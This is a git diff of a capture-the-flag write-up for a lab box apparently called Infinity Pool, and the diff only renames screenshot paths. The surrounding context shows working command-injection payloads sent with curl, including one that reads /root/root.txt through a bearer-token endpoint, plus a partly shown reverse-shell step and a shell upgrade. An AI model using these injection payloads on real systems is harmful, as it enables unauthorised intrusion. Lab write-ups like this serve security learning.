@@ -10,7 +10,7 @@ Started with a full port scan to see what we're working with.
 nmap -sV -sC -p- --min-rate 1000 10.113.147.93
 ```
 
-![nmap scan](../Screenshots/ByteLotusHotel2/01-nmap-scan.png)
+![nmap scan](../Screenshots/infinity-pool/01-nmap-scan.png)
 
 22 (SSH) and 80 (HTTP, running on Gunicorn — so a Python app behind the scenes, not Apache/Nginx directly). The nmap output also flagged robots.txt with two disallowed paths, `/internal/` and `/status`, which is basically the box pointing at where to look next.
 
@@ -24,7 +24,7 @@ Before going anywhere near `/status`, I checked the page source on the static JS
 view-source:http://10.113.147.93/static/app.js
 ```
 
-![app.js source comment](../Screenshots/ByteLotusHotel2/02-appjs-source-hint.png)
+![app.js source comment](../Screenshots/infinity-pool/02-appjs-source-hint.png)
 
 Jackpot. A dev comment straight up says the `/status` tool posts to `/internal/netcheck`, calls it "legacy," and says it's disallowed in robots.txt "for now." That's basically a roadmap.
 
@@ -34,7 +34,7 @@ Jackpot. A dev comment straight up says the `/status` tool posts to `/internal/n
 curl -s -X POST http://10.113.147.93/internal/netcheck -d "host=127.0.0.1; id"
 ```
 
-![command injection confirmed](../Screenshots/ByteLotusHotel2/03-command-injection-confirmed.png)
+![command injection confirmed](../Screenshots/infinity-pool/03-command-injection-confirmed.png)
 
 `uid=1001(web) gid=1001(web) groups=1001(web)` came back right after the ping output. Full command injection, no auth needed on that endpoint at all.
 
@@ -42,7 +42,7 @@ curl -s -X POST http://10.113.147.93/internal/netcheck -d "host=127.0.0.1; id"
 
 Grabbed the standard bash TCP one-liner to turn this into an actual shell instead of firing one-off commands through curl all day.
 
-![reverse shell payload reference](../Screenshots/ByteLotusHotel2/04-reverse-shell-payload-reference.png)
+![reverse shell payload reference](../Screenshots/infinity-pool/04-reverse-shell-payload-reference.png)
 
 First attempt failed with a weird `Unterminated quoted string` error:
 
@@ -58,7 +58,7 @@ curl -s -X POST http://10.113.147.93/internal/netcheck --data-urlencode "host=12
 
 Caught it on the listener right after.
 
-![reverse shell caught](../Screenshots/ByteLotusHotel2/05-reverse-shell-caught.png)
+![reverse shell caught](../Screenshots/infinity-pool/05-reverse-shell-caught.png)
 
 Landed as `web` in `/var/www/infinity_pool/edge`. Upgraded to a proper TTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'` so I could actually work in it.
 
@@ -68,7 +68,7 @@ Grabbed the app source while I was in the app directory, just to confirm exactly
 cat app.py
 ```
 
-![app.py source](../Screenshots/ByteLotusHotel2/06-app-py-source.png)
+![app.py source](../Screenshots/infinity-pool/06-app-py-source.png)
 
 Yep — `subprocess.run(f"ping -c 1 {host}", shell=True, ...)`. Host goes straight into a shell string, zero sanitization. Textbook.
 
@@ -78,7 +78,7 @@ Yep — `subprocess.run(f"ping -c 1 {host}", shell=True, ...)`. Host goes straig
 cat /home/web/user.txt
 ```
 
-![user flag](../Screenshots/ByteLotusHotel2/07-user-flag.png)
+![user flag](../Screenshots/infinity-pool/07-user-flag.png)
 
 `THM{n0_v1s1bl3_3dg3}`
 
@@ -92,7 +92,7 @@ Started looking at what else was running on the box instead:
 cd /var/www/ && ls && cd infinity_pool && ls
 ```
 
-![internal services discovered](../Screenshots/ByteLotusHotel2/08-internal-services-discovered.png)
+![internal services discovered](../Screenshots/infinity-pool/08-internal-services-discovered.png)
 
 Two more apps sitting next to `edge`: `automation` and `watchtower`. Couldn't `cd` into either — permission denied on both. But `ps auxww` told a different story about who owns them:
 
@@ -175,7 +175,7 @@ Eventually got the session/token handling right and the leaked creds (`FreePBXUC
 
 Once in, there was a single voicemail sitting in the inbox with the token just sitting in the caller ID field:
 
-![UCP voicemail token leak](../Screenshots/ByteLotusHotel2/11-ucp-voicemail-token-leak.png)
+![UCP voicemail token leak](../Screenshots/infinity-pool/11-ucp-voicemail-token-leak.png)
 
 `"Automation Key cc_auto_7b3f9a1c4e0d2f6a <9000>"` — right there. Nice hiding spot for a telephony-themed box, gave the ops team a reason to have a UCP inbox worth checking at all.
 
@@ -187,8 +187,6 @@ With the bearer token, `/jobs/export` opened up. The `report` field goes into a 
 curl -sS -X POST http://127.0.0.1:9000/jobs/export -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' --data-binary '{"report":"test;cat /root/root.txt;#"}'
 ```
 
-![root flag](../Screenshots/ByteLotusHotel2/12-root-flag.png)
+![root flag](../Screenshots/infinity-pool/12-root-flag.png)
 
 `THM{tr4c3d_**_***_*******}`
-
-
